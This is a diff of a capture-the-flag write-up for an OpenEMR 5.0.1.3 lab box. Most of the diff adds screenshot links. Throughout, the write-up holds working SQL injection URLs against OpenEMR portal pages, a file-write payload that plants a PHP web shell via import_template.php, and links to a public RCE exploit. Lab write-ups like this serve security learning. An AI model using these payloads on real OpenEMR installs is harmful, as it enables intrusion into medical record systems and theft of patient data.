@@ -250,24 +250,53 @@ Requests/sec.: 190.7288
 
 `--hh 8193` filters out replies that are 8193 chars long, which was what it replied for pretty much everything, even if it didn't exist.
 
+![](../../.gitbook/assets/8-openemr.png)
+
 add to hosts navigating to `http://hms.htb` redirects to a login page at `http://hms.htb/interface/login/login.php?site=default` the creds from the previous site do not work here
 
 [https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69](https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69) download script from [https://github.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/blob/master/openemr\_exploit.py](https://github.com/musyoka101/OpenEMR-5.0.1-Remote-Code-execution-Vulnerability-Exploit/blob/master/openemr_exploit.py)
 
 [https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting\#Arbitrary](https://labs.bishopfox.com/advisories/openemr-5-0-16-remote-code-execution-cross-site-scripting#Arbitrary)
 
-ran dirbuster: shows admin.php which shows the version of this site. \(5.0.1\(3\)\) Searching for a vulnerability for this site leads to CVE-2019-8371 [https://www.cvedetails.com/cve/CVE-2019-8371/](https://www.cvedetails.com/cve/CVE-2019-8371/) There is also a vulnerability report that I found that deals with this specific version \(5.0.1.3\). [https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) This report details `admin.php`=unauthenticated user will be prompted with the database name, the site ID as well as the current version of OpenEMR.
+![](../../.gitbook/assets/12-hms-dirbuster.png)
+
+ran dirbuster: shows admin.php 
+
+![](../../.gitbook/assets/10-hms-admin.php.png)
+
+which shows the version of this site. \(5.0.1\(3\)\) Searching for a vulnerability for this site leads to CVE-2019-8371 [https://www.cvedetails.com/cve/CVE-2019-8371/](https://www.cvedetails.com/cve/CVE-2019-8371/) There is also a vulnerability report that I found that deals with this specific version \(5.0.1.3\). [https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf](https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf) This report details `admin.php`=unauthenticated user will be prompted with the database name, the site ID as well as the current version of OpenEMR.
+
+![](../../.gitbook/assets/13-sql-patch.png)
 
 `sql_patch.php`=reveals current patch level "OpenEMR Version = 5.0.1\(3\)"
 
+![](../../.gitbook/assets/7-hms-public.png)
+
+
+
+![](../../.gitbook/assets/11-setup.png)
+
+![](../../.gitbook/assets/14-register.png)
+
+![](../../.gitbook/assets/15-messaging.png)
+
+
+
+![](../../.gitbook/assets/16-secure-chat.png)
+
 Since the patient portal didnt seem to reveal any useful information, I moved on to the next section, SQL injection. The first example sounded interesting, because combined with the patient portal bypass, I could use the authenticated SQLi vulnerability.
+
+![](../../.gitbook/assets/17-duplicate-query.png)
 
 ```text
 http://hms.htb/portal/find_appt_popup_user.php?catid=1' AND (SELECT 0 FROM(SELECT COUNT(*),CONCAT(@@VERSION,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
 ```
 
+![](../../.gitbook/assets/18-system-user%20%281%29.png)
+
 ```text
 /portal/add_edit_event_user.php?eid=1 AND EXTRACTVALUE(0,CONCAT(0x5c,VERSION()))
+
 ```
 
 system\_user\(\) gets openemr@localhost database\(\) gets openemr
@@ -566,7 +595,19 @@ Stopped: Mon Aug 10 09:35:25 2020
 
 This was one lazy admin. The password was `xxxxxx`.
 
+![](../../.gitbook/assets/19-login.png)
+
+![](../../.gitbook/assets/20-administrator-portal.png)
+
+![](../../.gitbook/assets/21-acl.png)
+
+![](../../.gitbook/assets/22-users.png)
+
+![](../../.gitbook/assets/23-file-upload.png)
+
 can edit files in `/var/www/hms.htb/public_html/sites/default`
+
+![](../../.gitbook/assets/29-vuln-reportpdf.png)
 
 according to pdf can read and write arbitrary files on the filesystem with:
 
@@ -574,6 +615,12 @@ according to pdf can read and write arbitrary files on the filesystem with:
 * `mode=save&docid=rce.php&content=<?php phpinfo();?>`
 
   on the page `/portal/import_template.php`
+
+![](../../.gitbook/assets/25-burp-rce-upload.png)
+
+![](../../.gitbook/assets/26-rce.png)
+
+![](../../.gitbook/assets/24-etc-passwd.png)
 
 Got `/etc/passwd`, can see that `luffy`, `ash`, and `root` are the only users that can log in. Played around with running commands with a simple shell, then remembered that I had downloaded a python exploit that required authentication to the portal to work. `mode=save&docid=rce.php&content=<?php system($_GET["evil"]); ?>`
 
